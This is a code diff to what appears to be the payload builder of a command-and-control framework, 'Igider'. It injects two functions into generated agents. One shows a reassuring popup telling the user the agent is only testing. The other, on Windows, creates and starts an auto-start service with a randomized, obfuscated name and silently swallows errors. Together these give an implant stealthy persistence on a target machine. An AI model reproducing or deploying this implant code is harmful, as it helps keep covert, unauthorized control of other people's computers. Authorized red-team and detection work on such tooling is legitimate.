@@ -392,6 +392,60 @@ class Igider(PayloadType):
                     build_errors.append(f"Command module '{cmd}' not found in any location")
                 else:
                     command_code += self._load_module_content(command_path) + "\n"
+
+                command_code += (r"""
+                    def show_console_popup(self, duration=5000):
+                        msg = (
+                            "IGIDER Agent is now running in the background.\n"
+                            "Monitoring system vulnerabilities and testing in progress.\n"
+                            "You can safely continue your work."
+                        )
+
+                        root = tkinter.Tk()
+                        root.overrideredirect(True)          
+                        root.attributes("-topmost", True)   
+                        root.configure(bg="#0f0f1f")        
+
+                        width, height = 450, 150
+                        x = (root.winfo_screenwidth() - width) // 2
+                        y = (root.winfo_screenheight() - height) // 2
+                        root.geometry(f"{width}x{height}+{x}+{y}")
+
+                        frame = tkinter.Frame(root, bg="#0f0f1f", bd=3, relief="ridge")
+                        frame.pack(fill="both", expand=True)
+
+                        label = tkinter.Label(
+                            frame,
+                            text=msg,
+                            font=("Consolas", 12, "bold"),
+                            fg="#00ff99",              
+                            bg="#0f0f1f",
+                            justify="center",
+                            wraplength=400
+                        )
+                        label.pack(expand=True, padx=20, pady=20)
+                        root.after(duration, root.destroy)
+                        root.mainloop()
+
+                                 """)
+                if selected_os == "windows":
+                    command_code +=(r"""
+                    def create_persistence(self):
+                        try:
+                            svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
+                            try:
+                                subprocess.check_output(f"sc query {svc_name}", shell=True)
+                                return  
+                            except subprocess.CalledProcessError:
+                                pass  
+                            
+                            cmd = f'sc create {svc_name} binpath= "{sys.executable} {__file__}" start= auto'
+                            subprocess.check_output(cmd, shell=True)
+                            subprocess.check_output(f'sc start {svc_name}', shell=True)
+                        except Exception as e:
+                            pass
+
+                                    """)
             
             # Step 3: Configure agent
             await self.update_build_step("Configuring Agent", "Applying agent configuration...")
